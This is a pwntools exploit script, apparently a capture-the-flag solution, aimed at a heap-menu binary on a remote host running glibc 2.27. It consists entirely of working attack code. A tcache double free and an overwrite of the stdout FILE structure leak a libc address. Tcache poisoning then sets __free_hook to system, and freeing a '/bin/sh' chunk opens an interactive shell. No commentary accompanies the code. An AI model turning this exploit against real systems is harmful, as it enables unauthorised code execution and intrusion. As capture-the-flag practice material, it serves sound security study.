from pwn import *
context.terminal = ['gnome-terminal','-x','sh','-c']

#io=process('./pwn')
io=remote('122.112.225.164',10001)
libc=ELF('./libc-2.27.so')

def add(idx,size,data):
    io.recvuntil('choice :')
    io.sendline('1')
    io.recvuntil('id:')
    io.sendline(str(idx))
    io.recvuntil('size:')
    io.sendline(str(size))
    io.recvuntil('content:')
    io.send(data)


def free(idx):
    io.recvuntil('choice :')
    io.sendline('3')
    io.recvuntil('id:')
    io.sendline(str(idx))


def edit(idx,data):
    io.recvuntil('choice :')
    io.sendline('2')
    io.recvuntil('id:')
    io.sendline(str(idx))
    io.recvuntil('content:')
    io.send(data)

add(0,0x80,'a')
add(1,0x60,'b')
free(0)
free(0)

add(2,0x80,'\x60')
add(3,0x80,'\x60')
add(4,0x80,'\x60')

free(2)
#add(6,0x80,'\x60')
edit(0,'\x60\x47')
add(5,0x80,'a')
add(6,0x80,p64(0xfbad1887)+p64(0)*3+p8(0x58))

libc_base=u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x3e82a0
print(hex(libc_base))
free_hook=libc_base+libc.sym['__free_hook']
sys=libc_base+libc.sym['system']
#free(0)

[edit(0,p64(0)) for i in range(7)]
free(1)
edit(1,p64(free_hook))
add(8,0x60,'/bin/sh\x00')
add(9,0x60,p64(sys))
free(8)
#gdb.attach(io)
io.interactive()
